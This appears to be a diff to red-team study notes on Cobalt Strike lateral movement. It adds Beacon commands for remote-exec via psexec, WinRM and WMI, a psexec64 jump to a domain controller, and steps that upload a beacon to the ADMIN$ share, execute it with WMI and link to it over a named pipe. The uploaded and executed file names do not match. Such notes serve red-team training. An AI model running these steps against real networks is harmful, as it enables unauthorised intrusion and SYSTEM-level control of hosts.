@@ -50,6 +50,19 @@ Beacon Remote Exploits
 
 hey require more manual work to manage the payload, but do offer a wider degree of control over what gets executed on the target. You also need to connect to P2P Beacons manually using `connect` or `link`.
 
+```
+beacon> remote-exec
+
+Beacon Remote Execute Methods
+=============================
+
+    Methods                         Description
+    -------                         -----------
+    psexec                          Remote execute via Service Control Manager
+    winrm                           Remote execute via WinRM (PowerShell)
+    wmi                             Remote execute via WMI
+```
+
 ## Powershell and execute-assembly
 
 We can specify the target in `powershell` and `execute-assembly` commands.
@@ -86,3 +99,26 @@ The `psexec` and `psexec64` commands, first a service binary is uploaded to the 
 `psexec_psh` doesn't copy the binary to the target, but instead executes a PowerShell one-liner (always in 32-bit).
 
 PsExec will return a beacon running by **SYSTEM**.
+
+```
+beacon> jump psexec64 dc01 [p2p-listener]
+```
+
+# Windows Management Instrumentation (WMI)
+
+The `wmi` `remote-exec` method uses WMI's *process call create* to execute any command we specify on the target.
+
+The most straight forward means of using this to upload a payload to the target system and use WMI to execute it.
+
+```
+beacon> cd \\dc01\ADMIN$
+beacon> upload C:\p2p-smb-beacon.exe
+beacon> remote-exec wmi dc01 C:\Windows\beacon.exe
+```
+
+After executing the beacon we will neeed to connect to it.
+
+```
+beacon> link dc01 \\dc01\pipe\[namepipe]
+```
+
